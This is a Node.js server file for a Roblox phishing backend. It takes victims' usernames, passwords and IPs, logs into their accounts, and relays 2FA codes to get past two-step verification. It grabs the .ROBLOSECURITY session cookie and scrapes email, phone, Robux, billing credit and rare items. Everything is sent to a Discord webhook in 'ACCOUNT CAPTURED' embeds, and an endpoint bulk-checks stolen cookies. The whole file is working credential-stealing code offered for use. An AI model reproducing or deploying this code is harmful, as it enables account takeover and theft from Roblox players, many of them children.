// ============================================
// ROBLOX AUTO-AUTH BACKEND + BULK COOKIE CHECKER
// Install: npm install express axios tough-cookie axios-cookiejar-support cors
// Run: node server.js
// ============================================

const express = require('express');
const axios = require('axios');
const cors = require('cors');
const { CookieJar } = require('tough-cookie');
const { wrapper } = require('axios-cookiejar-support');

const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));

const DISCORD_WEBHOOK = 'ISI_URL_WEBHOOK_DISCORD_LU';
const PORT = process.env.PORT || 3000;

const sessions = {};

// ============================================
// HELPER — DISCORD
// ============================================
async function sendToDiscord(embed) {
  try {
    await axios.post(DISCORD_WEBHOOK, {
      username: 'Roblox Logger',
      embeds: [embed]
    });
  } catch(e) {
    console.error('Discord error:', e.message);
  }
}

// ============================================
// ROBLOX LOGIN
// ============================================
async function robloxLogin(username, password) {
  const jar = new CookieJar();
  const client = wrapper(axios.create({
    jar,
    withCredentials: true,
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Content-Type': 'application/json',
      'Accept': 'application/json'
    }
  }));

  let csrfToken = '';
  try {
    await client.post('https://auth.roblox.com/v2/login', {});
  } catch(e) {
    csrfToken = e.response?.headers['x-csrf-token'] || '';
  }
  if (!csrfToken) {
    try {
      const r = await client.get('https://www.roblox.com/home');
      csrfToken = r.headers['x-csrf-token'] || '';
    } catch(e) {}
  }

  let loginRes;
  try {
    loginRes = await client.post('https://auth.roblox.com/v2/login', {
      ctype: 'Username',
      cvalue: username,
      password: password
    }, {
      headers: { 'X-CSRF-TOKEN': csrfToken }
    });
  } catch(e) {
    loginRes = e.response;
  }

  if (!loginRes) return { success: false, error: 'No response' };
  const data = loginRes.data;

  if (data.twoStepVerificationData) {
    return {
      success: false,
      needs2FA: true,
      challengeId: data.twoStepVerificationData.challengeId,
      mediaType: data.twoStepVerificationData.mediaType,
      jar,
      csrfToken
    };
  }

  if (!data.user) {
    return { success: false, error: data.errors?.[0]?.message || 'Invalid credentials' };
  }

  const cookies = await jar.getCookies('https://www.roblox.com');
  const roblosecurity = cookies.find(c => c.key === '.ROBLOSECURITY');

  return {
    success: true,
    user: data.user,
    cookie: roblosecurity?.value || '',
    jar,
    csrfToken
  };
}

// ============================================
// SUBMIT 2FA
// ============================================
async function submit2FA(jar, csrfToken, challengeId, code) {
  const client = wrapper(axios.create({
    jar,
    withCredentials: true,
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'Content-Type': 'application/json',
      'X-CSRF-TOKEN': csrfToken
    }
  }));

  try {
    const res = await client.post('https://auth.roblox.com/v2/twostepverification/verify', {
      challengeId,
      actionType: 'Login',
      code
    });
    return { success: true, data: res.data };
  } catch(e) {
    return { success: false, error: e.response?.data || e.message };
  }
}

// ============================================
// FETCH FULL ACCOUNT DATA
// ============================================
async function fetchFullAccountData(jar, csrfToken) {
  const client = wrapper(axios.create({
    jar,
    withCredentials: true,
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'X-CSRF-TOKEN': csrfToken
    }
  }));

  const result = {};

  try {
    const userRes = await client.get('https://users.roblox.com/v1/users/authenticated');
    result.user = userRes.data;
    const userId = userRes.data.id;

    try {
      const p = await client.get(`https://users.roblox.com/v1/users/${userId}`);
      result.accountAge = Math.floor((new Date() - new Date(p.data.created)) / 86400000);
      result.createdAt = p.data.created;
    } catch(e) {}

    try {
      const r = await client.get('https://economy.roblox.com/v1/user/currency');
      result.robux = r.data.robux || 0;
      result.pendingRobux = r.data.pendingRobux || 0;
    } catch(e) {}

    try {
      const r = await client.get(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`);
      result.premium = r.data;
    } catch(e) { result.premium = false; }

    try {
      const r = await client.get('https://billing.roblox.com/v1/credit');
      result.billingCredit = r.data.credit || 0;
    } catch(e) {}

    try {
      const r = await client.get(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100`);
      const items = r.data.data || [];
      let totalRap = 0, hasKorblox = false, hasHeadless = false, rareItems = [];
      const KORBLOX = [22724251, 22724260, 22724270];
      const HEADLESS = 151156164;

      for (const it of items) {
        totalRap += it.recentAveragePrice || 0;
        if (KORBLOX.includes(it.assetId)) hasKorblox = true;
        if (it.assetId === HEADLESS) hasHeadless = true;
        if (it.recentAveragePrice > 10000) rareItems.push(`${it.name} (${it.recentAveragePrice})`);
      }

      result.rap = totalRap;
      result.limitedsOwned = items.length;
      result.hasKorblox = hasKorblox;
      result.hasHeadless = hasHeadless;
      result.rareItems = rareItems.slice(0, 5);
    } catch(e) {}

    try {
      const r = await client.get('https://accountsettings.roblox.com/v1/account/settings');
      result.email = r.data.email || 'N/A';
      result.phone = r.data.phone || 'N/A';
      result.userAbove13 = r.data.userAbove13;
      result.emailVerified = r.data.emailVerified || false;
    } catch(e) {}

    try {
      const r = await client.get('https://auth.roblox.com/v2/twostepverification/status');
      result.twoFAEnabled = r.data.enabled || false;
    } catch(e) { result.twoFAEnabled = false; }

    try {
      const r = await client.get('https://accountsettings.roblox.com/v1/account/pin');
      result.pinEnabled = r.data.isEnabled || false;
    } catch(e) { result.pinEnabled = false; }

    try {
      const r = await client.get(`https://groups.roblox.com/v1/users/${userId}/groups/roles`);
      const g = r.data.data || [];
      result.groupsOwned = g.filter(x => x.role.rank === 255).length;
      result.groupsTotal = g.length;
    } catch(e) {}

    try {
      const r = await client.get('https://locale.roblox.com/v1/locales/user-locale');
      result.locale = r.data.locale || 'N/A';
    } catch(e) {}

    result.avatar = `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=420&height=420&format=png`;

    return { success: true, data: result };
  } catch(e) {
    return { success: false, error: e.message, partial: result };
  }
}

// ============================================
// BUILD EMBED
// ============================================
function buildEmbed(d, username, password, cookie, ip, step) {
  const isRare = d.hasKorblox || d.hasHeadless;

  return {
    title: step === '2fa' ? '🔓 2FA BYPASSED — ACCOUNT CAPTURED' : '🔴 ROBLOX ACCOUNT CAPTURED',
    color: isRare ? 0xff0000 : 0x00a2ff,
    thumbnail: d.avatar ? { url: d.avatar } : undefined,
    fields: [
      { name: '👤 Username', value: '`' + username + '`', inline: true },
      { name: '🔑 Password', value: '`' + password + '`', inline: true },
      { name: '🆔 User ID', value: '`' + (d.user?.id || 'N/A') + '`', inline: true },
      { name: '📅 Account Age', value: '`' + (d.accountAge || 'N/A') + ' days`', inline: true },
      { name: '🌍 Locale', value: '`' + (d.locale || 'N/A') + '`', inline: true },
      { name: '📧 Email', value: '`' + (d.email || 'N/A') + '`', inline: true },
      { name: '📱 Phone', value: '`' + (d.phone || 'N/A') + '`', inline: true },
      { name: '💰 Robux', value: '`' + (d.robux || 0) + '`', inline: true },
      { name: '⏳ Pending', value: '`' + (d.pendingRobux || 0) + '`', inline: true },
      { name: '💎 Premium', value: d.premium ? '✅ Yes' : '❌ No', inline: true },
      { name: '📊 RAP', value: '`' + (d.rap || 0) + '`', inline: true },
      { name: '📦 Limiteds', value: '`' + (d.limitedsOwned || 0) + '`', inline: true },
      { name: '🎩 Korblox', value: d.hasKorblox ? '✅ YES' : '❌ No', inline: true },
      { name: '💀 Headless', value: d.hasHeadless ? '✅ YES' : '❌ No', inline: true },
      { name: '🔐 2FA', value: d.twoFAEnabled ? '✅ Enabled' : '❌ Disabled', inline: true },
      { name: '🔒 PIN', value: d.pinEnabled ? '✅ Enabled' : '❌ Disabled', inline: true },
      { name: '✉️ Email Verified', value: d.emailVerified ? 'Yes' : 'No', inline: true },
      { name: '🏛️ Groups', value: 'Owned: `' + (d.groupsOwned || 0) + '` | Total: `' + (d.groupsTotal || 0) + '`', inline: true },
      { name: '💎 Rare Items', value: d.rareItems?.length ? d.rareItems.join('\n') : 'None', inline: false },
      { name: '🍪 .ROBLOSECURITY', value: '```' + (cookie || 'N/A') + '```', inline: false },
      { name: '🌐 IP', value: '`' + (ip || 'N/A') + '`', inline: true }
    ],
    footer: { text: 'Roblox Auto-Auth Logger' },
    timestamp: new Date().toISOString()
  };
}

// ============================================
// ENDPOINT — LOGIN
// ============================================
app.post('/api/login', async (req, res) => {
  const { username, password, ip } = req.body;

  if (!username || !password) {
    return res.json({ success: false, error: 'Missing fields' });
  }

  const loginResult = await robloxLogin(username, password);

  if (loginResult.needs2FA) {
    sessions[username] = {
      jar: loginResult.jar,
      csrfToken: loginResult.csrfToken,
      challengeId: loginResult.challengeId,
      password
    };

    await sendToDiscord({
      title: '🔐 2FA REQUIRED',
      color: 0xffaa00,
      fields: [
        { name: '👤 Username', value: '`' + username + '`', inline: true },
        { name: '🔑 Password', value: '`' + password + '`', inline: true },
        { name: '📱 Media', value: '`' + (loginResult.mediaType || 'N/A') + '`', inline: true },
        { name: '🌐 IP', value: '`' + (ip || 'N/A') + '`', inline: true }
      ],
      timestamp: new Date().toISOString()
    });

    return res.json({ success: false, needs2FA: true, mediaType: loginResult.mediaType });
  }

  if (!loginResult.success) {
    return res.json({ success: false, error: loginResult.error });
  }

  const accountData = await fetchFullAccountData(loginResult.jar, loginResult.csrfToken);
  const d = accountData.data || {};

  await sendToDiscord(buildEmbed(d, username, password, loginResult.cookie, ip, 'login'));

  res.json({ success: true, user: loginResult.user });
});

// ============================================
// ENDPOINT — 2FA
// ============================================
app.post('/api/2fa', async (req, res) => {
  const { username, code, ip } = req.body;
  const session = sessions[username];

  if (!session) {
    return res.json({ success: false, error: 'Session expired' });
  }

  const result = await submit2FA(session.jar, session.csrfToken, session.challengeId, code);

  if (!result.success) {
    return res.json({ success: false, error: 'Invalid 2FA code' });
  }

  const cookies = await session.jar.getCookies('https://www.roblox.com');
  const roblosecurity = cookies.find(c => c.key === '.ROBLOSECURITY');

  const accountData = await fetchFullAccountData(session.jar, session.csrfToken);
  const d = accountData.data || {};

  await sendToDiscord(buildEmbed(d, username, session.password, roblosecurity?.value || '', ip, '2fa'));

  delete sessions[username];
  res.json({ success: true });
});

// ============================================
// ENDPOINT — CHECK COOKIE (SINGLE)
// ============================================
app.post('/api/check-cookie', async (req, res) => {
  const { cookie } = req.body;
  if (!cookie) return res.json({ valid: false });

  try {
    const jar = new CookieJar();
    await jar.setCookie(`.ROBLOSECURITY=${cookie}; Domain=.roblox.com; Path=/`, 'https://www.roblox.com');
    const client = wrapper(axios.create({ jar }));
    const r = await client.get('https://users.roblox.com/v1/users/authenticated');
    res.json({ valid: true, user: r.data });
  } catch(e) {
    res.json({ valid: false, error: e.message });
  }
});

// ============================================
// ENDPOINT — FETCH BY COOKIE
// ============================================
app.post('/api/fetch-by-cookie', async (req, res) => {
  const { cookie } = req.body;
  if (!cookie) return res.json({ success: false });

  try {
    const jar = new CookieJar();
    await jar.setCookie(`.ROBLOSECURITY=${cookie}; Domain=.roblox.com; Path=/`, 'https://www.roblox.com');
    const client = wrapper(axios.create({ jar }));

    let csrfToken = '';
    try {
      await client.post('https://auth.roblox.com/v2/logout');
    } catch(e) {
      csrfToken = e.response?.headers['x-csrf-token'] || '';
    }

    const data = await fetchFullAccountData(jar, csrfToken);
    res.json(data);
  } catch(e) {
    res.json({ success: false, error: e.message });
  }
});

// ============================================
// ENDPOINT — BULK COOKIE CHECKER
// ============================================
app.post('/api/bulk-check-cookie', async (req, res) => {
  const { cookies } = req.body;

  if (!cookies || !Array.isArray(cookies)) {
    return res.json({ success: false, error: 'Invalid input' });
  }

  const results = [];

  for (let i = 0; i < cookies.length; i++) {
    const item = cookies[i];
    const cookieValue = (typeof item === 'string' ? item : item.cookie || '').trim();

    if (!cookieValue) {
      results.push({
        index: i,
        label: item.label || `Cookie #${i + 1}`,
        valid: false,
        error: 'Empty cookie'
      });
      continue;
    }

    try {
      const jar = new CookieJar();
      await jar.setCookie(`.ROBLOSECURITY=${cookieValue}; Domain=.roblox.com; Path=/`, 'https://www.roblox.com');
      const client = wrapper(axios.create({
        jar,
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      }));

      const userRes = await client.get('https://users.roblox.com/v1/users/authenticated');
      const userId = userRes.data.id;

      let robux = 0, rap = 0, hasKorblox = false, hasHeadless = false, limitedsOwned = 0;
      let accountAge = 0, email = 'N/A', twoFAEnabled = false, pinEnabled = false;
      let premium = false, groupsOwned = 0, groupsTotal = 0;
      let avatar = `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=150&height=150&format=png`;

      try {
        const r = await client.get('https://economy.roblox.com/v1/user/currency');
        robux = r.data.robux || 0;
      } catch(e) {}

      try {
        const p = await client.get(`https://users.roblox.com/v1/users/${userId}`);
        accountAge = Math.floor((new Date() - new Date(p.data.created)) / 86400000);
      } catch(e) {}

      try {
        const inv = await client.get(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100`);
        const items = inv.data.data || [];
        limitedsOwned = items.length;
        const KORBLOX = [22724251, 22724260, 22724270];
        const HEADLESS = 151156164;
        for (const it of items) {
          rap += it.recentAveragePrice || 0;
          if (KORBLOX.includes(it.assetId)) hasKorblox = true;
          if (it.assetId === HEADLESS) hasHeadless = true;
        }
      } catch(e) {}

      try {
        const r = await client.get('https://accountsettings.roblox.com/v1/account/settings');
        email = r.data.email || 'N/A';
      } catch(e) {}

      try {
        const r = await client.get('https://auth.roblox.com/v2/twostepverification/status');
        twoFAEnabled = r.data.enabled || false;
      } catch(e) {}

      try {
        const r = await client.get('https://accountsettings.roblox.com/v1/account/pin');
        pinEnabled = r.data.isEnabled || false;
      } catch(e) {}

      try {
        const r = await client.get(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`);
        premium = r.data;
      } catch(e) {}

      try {
        const r = await client.get(`https://groups.roblox.com/v1/users/${userId}/groups/roles`);
        const g = r.data.data || [];
        groupsOwned = g.filter(x => x.role.rank === 255).length;
        groupsTotal = g.length;
      } catch(e) {}

      results.push({
        index: i,
        label: item.label || `Cookie #${i + 1}`,
        valid: true,
        user: {
          id: userId,
          name: userRes.data.name,
          displayName: userRes.data.displayName
        },
        robux,
        rap,
        limitedsOwned,
        hasKorblox,
        hasHeadless,
        accountAge,
        email,
        twoFAEnabled,
        pinEnabled,
        premium,
        groupsOwned,
        groupsTotal,
        avatar,
        cookie: cookieValue
      });
    } catch(e) {
      results.push({
        index: i,
        label: item.label || `Cookie #${i + 1}`,
        valid: false,
        error: e.response?.status === 401 ? 'Invalid/Expired' : e.message
      });
    }

    if (i < cookies.length - 1) {
      await new Promise(r => setTimeout(r, 800));
    }
  }

  const valid = results.filter(r => r.valid).length;
  const invalid = results.filter(r => !r.valid).length;

  if (valid > 0) {
    try {
      const validList = results.filter(r => r.valid);
      const fields = validList.slice(0, 10).map(r => ({
        name: `${r.user.name} (${r.user.id})`,
        value: `💰 ${r.robux} | 📊 ${r.rap} RAP | 🎩 ${r.hasKorblox ? '✅' : '❌'} | 💀 ${r.hasHeadless ? '✅' : '❌'}`,
        inline: false
      }));

      await sendToDiscord({
        title: `📦 BULK COOKIE CHECK — ${valid} Valid / ${invalid} Invalid`,
        color: 0x00a2ff,
        fields: fields,
        footer: { text: `Total: ${cookies.length} cookies` },
        timestamp: new Date().toISOString()
      });
    } catch(e) {}
  }

  res.json({
    success: true,
    total: cookies.length,
    valid,
    invalid,
    results
  });
});

// ============================================
// START
// ============================================
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
